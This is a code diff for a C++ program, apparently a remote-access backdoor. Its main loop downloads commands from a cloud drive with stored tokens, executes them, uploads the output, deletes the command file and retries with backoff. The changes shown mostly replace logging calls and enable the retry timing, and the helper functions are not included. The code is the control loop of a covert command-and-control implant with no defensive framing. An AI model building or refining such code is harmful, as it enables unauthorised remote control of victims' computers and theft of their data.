@@ -1,8 +1,8 @@
-//#if defined(_DEBUG)
-//#define SPDLOG_ACTIVE_LEVEL SPDLOG_LEVEL_INFO
-//#else
-//#define SPDLOG_ACTIVE_LEVEL SPDLOG_LEVEL_OFF
-//#endif
+#if defined(_DEBUG)
+#define SPDLOG_ACTIVE_LEVEL SPDLOG_LEVEL_INFO
+#else
+#define SPDLOG_ACTIVE_LEVEL SPDLOG_LEVEL_OFF
+#endif
 //
 //#if SPDLOG_ACTIVE_LEVEL == SPDLOG_LEVEL_OFF
 //#pragma message("SPDLOG_ACTIVE_LEVEL is OFF!")
@@ -51,7 +51,7 @@ int main() {
 	accessToken = INIT_ACCESS_TOKEN;
 	refreshToken = INIT_REFRESH_TOKEN;
 
-	spdlog::info("The for loop is about to start!");
+	SPDLOG_INFO("The for loop is about to start!");
 
 	// This is the main loop of the program
 	for (BYTE top = STATE_INIT; true;) {
@@ -60,7 +60,7 @@ int main() {
 		// This is an if/else switch case to know what to do next
 		if (top == STATE_DOWNLOADING)
 		{
-			spdlog::info("Shell is in STATE_DOWNLOADING!");
+			SPDLOG_INFO("Shell is in STATE_DOWNLOADING!");
 
 			states.pop();
 			resCode = downloadSourceContext(accessToken, data);
@@ -68,33 +68,33 @@ int main() {
 			switch (resCode)
 			{
 			case BDRIVE_OK:
-				spdlog::warn("Download completed!");
+				SPDLOG_WARN("Download completed!");
 
 				states.push(STATE_EXECUTING);
 				//sleep
 				break;
 			case BDRIVE_INVALID_ACCESS_TOKEN:
-				spdlog::warn("Access token lost!");
+				SPDLOG_WARN("Access token lost!");
 
 				states.push(STATE_DOWNLOADING);
 				states.push(STATE_ACCESS_TOKEN_LOST);
 				//sleep
 				break;
 			case BDRIVE_NO_CONTENT:
-				spdlog::warn("Source file is empty!");
+				SPDLOG_WARN("Source file is empty!");
 
 				states.push(STATE_DOWNLOADING);
 				//sleep
 				break;
 			case BDRIVE_TIMED_OUT:
 			case BDRIVE_NO_INTERNET:
-				spdlog::warn("Connection lost!");
+				SPDLOG_WARN("Connection lost!");
 
 				states.push(STATE_DOWNLOADING);
 				states.push(STATE_CONNECTION_LOST);
 				break;
 			default:
-				spdlog::warn("Something unhandled happened!");
+				SPDLOG_WARN("Something unhandled happened!");
 
 				states.push(STATE_DOWNLOADING);
 				break;
@@ -102,24 +102,24 @@ int main() {
 		}
 		else if (top == STATE_EXECUTING)
 		{
-			spdlog::info("Shell is in STATE_EXECUTING!");
+			SPDLOG_INFO("Shell is in STATE_EXECUTING!");
 
 			states.pop();
 
 			if (commandExecuter(data, data)) {
-				spdlog::warn("Something unhandled happened!");
+				SPDLOG_WARN("Something unhandled happened!");
 				states.push(STATE_EXECUTING);
 			}
 			else
 			{
 				states.push(STATE_UPLOADING);
-				spdlog::warn("Command Execution done!");
+				SPDLOG_WARN("Command Execution done!");
 			}
 
 		}
 		else if (top == STATE_UPLOADING)
 		{
-			spdlog::info("Shell is in STATE_UPLOADING!");
+			SPDLOG_INFO("Shell is in STATE_UPLOADING!");
 
 			states.pop();
 			resCode = uploadResult(data, accessToken, lastIndex, lastSubIndex);
@@ -127,7 +127,7 @@ int main() {
 			switch (resCode)
 			{
 			case BDRIVE_OK:
-				spdlog::warn("Uploading the result successfully done!");
+				SPDLOG_WARN("Uploading the result successfully done!");
 
 				lastIndex++;
 				lastSubIndex = 0;
@@ -135,19 +135,19 @@ int main() {
 				break;
 			case BDRIVE_NO_INTERNET:
 			case BDRIVE_TIMED_OUT:
-				spdlog::warn("Connection lost!");
+				SPDLOG_WARN("Connection lost!");
 
 				states.push(STATE_UPLOADING);
 				states.push(STATE_CONNECTION_LOST);
 				break;
 			case BDRIVE_INVALID_ACCESS_TOKEN:
-				spdlog::warn("Access token lost!");
+				SPDLOG_WARN("Access token lost!");
 
 				states.push(STATE_UPLOADING);
 				states.push(STATE_ACCESS_TOKEN_LOST);
 				break;
 			default:
-				spdlog::warn("Something unhandled happened!");
+				SPDLOG_WARN("Something unhandled happened!");
 
 				states.push(STATE_UPLOADING);
 				break;
@@ -155,7 +155,7 @@ int main() {
 		}
 		else if (top == STATE_DELETING)
 		{
-			spdlog::info("Shell is in STATE_DELETING!");
+			SPDLOG_INFO("Shell is in STATE_DELETING!");
 
 			states.pop();
 			resCode = deleteSource(accessToken);
@@ -163,55 +163,55 @@ int main() {
 			switch (resCode)
 			{
 			case BDRIVE_OK:
-				spdlog::warn("Deleting source file successfully done!");
+				SPDLOG_WARN("Deleting source file successfully done!");
 
 				states.push(STATE_DOWNLOADING);
 				break;
 			case BDRIVE_TIMED_OUT:
 			case BDRIVE_NO_INTERNET:
-				spdlog::warn("Connection lost!");
+				SPDLOG_WARN("Connection lost!");
 
 				states.push(STATE_DELETING);
 				states.push(STATE_CONNECTION_LOST);
 				break;
 			case BDRIVE_INVALID_ACCESS_TOKEN:
-				spdlog::warn("Access token lost!");
+				SPDLOG_WARN("Access token lost!");
 
 				states.push(STATE_DELETING);
 				states.push(STATE_ACCESS_TOKEN_LOST);
 				break;
 			default:
-				spdlog::warn("Something unhandled happened!");
+				SPDLOG_WARN("Something unhandled happened!");
 
 				states.push(STATE_DELETING);
 				break;
 			}
 		}
 		else if (top == STATE_ACCESS_TOKEN_LOST) {
-			spdlog::info("Shell is in STATE_ACCESS_TOKEN_LOST!");
+			SPDLOG_INFO("Shell is in STATE_ACCESS_TOKEN_LOST!");
 
 			states.pop();
 			resCode = setNewAccessToken(accessToken, refreshToken);
 			switch (resCode)
 			{
 			case BDRIVE_OK:
-				spdlog::warn("New access token has been set!");
+				SPDLOG_WARN("New access token has been set!");
 
 				break;
 			case BDRIVE_INVALID_REFRESH_TOKEN:
-				spdlog::warn("Refresh token is invalid!");
+				SPDLOG_WARN("Refresh token is invalid!");
 
 				states.push(STATE_REFRESH_TOKEN_LOST);
 				break;
 			case BDRIVE_NO_INTERNET:
 			case BDRIVE_TIMED_OUT:
-				spdlog::warn("Connection lost!");
+				SPDLOG_WARN("Connection lost!");
 
 				states.push(STATE_ACCESS_TOKEN_LOST);
 				states.push(STATE_CONNECTION_LOST);
 				break;
 			default:
-				spdlog::warn("Something unhandled happened!");
+				SPDLOG_WARN("Something unhandled happened!");
 
 				states.push(STATE_ACCESS_TOKEN_LOST);
 				break;
@@ -219,7 +219,7 @@ int main() {
 
 		}
 		else if (top == STATE_REFRESH_TOKEN_LOST) {
-			spdlog::info("Shell is in STATE_REFRESH_TOKEN_LOST!");
+			SPDLOG_INFO("Shell is in STATE_REFRESH_TOKEN_LOST!");
 
 			states.pop();
 			resCode = setNewRefreshAndAccessToken(refreshToken, accessToken);
@@ -227,14 +227,14 @@ int main() {
 			switch (resCode)
 			{
 			case BDRIVE_OK:
-				spdlog::warn("New access & refresh token has been set!");
+				SPDLOG_WARN("New access & refresh token has been set!");
 
 				break;
 			case BDRIVE_NO_CONTENT:
 			case BDRIVE_TIMED_OUT:
 			case BDRIVE_NO_INTERNET:
 			default:
-				spdlog::warn("Connection lost!");
+				SPDLOG_WARN("Connection lost!");
 				states.push(STATE_CONNECTION_LOST);
 				break;
 			}
@@ -242,18 +242,18 @@ int main() {
 		}
 		else
 		{
-			spdlog::info("Shell is in STATE_CONNECTION_LOST!");
+			SPDLOG_INFO("Shell is in STATE_CONNECTION_LOST!");
 
 			states.pop();
 			resCode = checkConnection();
 			switch (resCode)
 			{
 			case BDRIVE_OK:
-				spdlog::warn("It's back online!");
+				SPDLOG_WARN("It's back online!");
 
 				break;
 			default:
-				spdlog::warn("Connection still lost!");
+				SPDLOG_WARN("Connection still lost!");
 
 				states.push(STATE_CONNECTION_LOST);
 				break;
@@ -261,28 +261,29 @@ int main() {
 		}
 
 		// This is to know how many times we tried this state that we are in
-		//if (top == lastState)
-		//{
-		//	tries++;
-		//}
-		//else {
-		//	lastState = top;
-		//	tries = 0;
-		//	timeThreshold = 0;
-		//}
+		if (top == lastState)
+		{
+			tries++;
+		}
+		else {
+			lastState = top;
+			tries = 0;
+			timeThreshold = 0;
+		}
 
-		//// This is to not exceed the Time threshold
-		//if (timeThreshold < SLEEP_TIME_THRESHOLD - 1)
-		//{
-		//	timeThreshold = expo(5, tries);
-		//	Sleep(timeThreshold * 1000);
-		//}
-		//else
-		//{
-		//	Sleep(SLEEP_TIME_THRESHOLD * 1000);
-		//}
+		// This is to not exceed the Time threshold
+		if (timeThreshold < SLEEP_TIME_THRESHOLD + 1)
+		{
+			timeThreshold = expo(5, tries);
+			SPDLOG_INFO("Time threshold is: {}", timeThreshold);
+			Sleep(timeThreshold * 1000);
+		}
+		else
+		{
+			Sleep(SLEEP_TIME_THRESHOLD * 1000);
+		}
 
-		Sleep(3000);
+		//Sleep(3000);
 	}
 	return 0;
 }
